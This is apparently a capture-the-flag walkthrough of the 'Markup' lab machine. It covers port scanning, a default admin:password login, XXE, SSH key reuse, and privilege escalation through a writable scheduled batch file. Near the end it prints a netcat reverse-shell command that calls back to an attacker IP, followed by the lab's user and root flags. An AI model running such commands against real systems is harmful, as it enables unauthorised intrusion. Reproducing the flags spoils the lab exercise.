# Markup

## Initial Scan

```nmap
sudo nmap -T4 -v 10.129.202.209 -oA Markup-Basic
sudo nmap -T4 -p 22,80,443 -sV -sC -v 10.129.202.209 -oA Markup-sv
```

<figure><img src="../../../.gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (967).png" alt=""><figcaption></figcaption></figure>

## Task 1

What version of Apache is running on the target's port 80?

Answer: 2.4.41

## Task 2

What username:password combination logs in successfully?

<figure><img src="../../../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>

Just tried basic default logins

<figure><img src="../../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>

Answer: `admin:password`

## Task 3

What is the word at the top of the page that accepts user input?

<figure><img src="../../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>

Answer: Order

## Task 4

What XML version is used on the target?

<figure><img src="../../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>

Answer: 1.0

## Task 5

What does the XXE / XEE attack acronym stand for?

<figure><img src="../../../.gitbook/assets/image (972).png" alt=""><figcaption></figcaption></figure>

Answer: XML external entity

## Task 6

What username can we find on the webpage's HTML code?

<figure><img src="../../../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>

Answer: Daniel

## Task 7

What is the file located in the Log-Management folder on the target?

<figure><img src="../../../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

Put the rsa into a file on our machine

<figure><img src="../../../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

Login as daniel

<figure><img src="../../../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (977).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

Answer: job.bat

## Task 8

What executable is mentioned in the file mentioned before?

<figure><img src="../../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

Answer: wevtutil.exe

## Task 9

Submit user flag

<figure><img src="../../../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

Answer: 032d2fc8952a8c24e39c8f0ee9918ef7

## Task 10

Submit root flag

Run winpeas

<figure><img src="../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>

Under the section "Searching executable files in non-default folders with write (equivalent) permissions (can be slow)" We see

<figure><img src="../../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

Which from the previous question we have looked at. Run Let's run netcat to connect back to us as admin.

<figure><img src="../../../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>

Get nc.exe onto the target

<figure><img src="../../../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>

Run it to get admin on the system

```
echo C:\Users\Daniel\nc64.exe -e cmd.exe 10.10.14.38 1234 > C:\Log-Management\job.bat
```

<figure><img src="../../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>

I had troubles getting the shell to pop, which apparently is common, the root flag is under: `C:\Users\Administrator\Desktop\root.txt`

Answer: f574a3e7650cebd8c39784299cb570f8
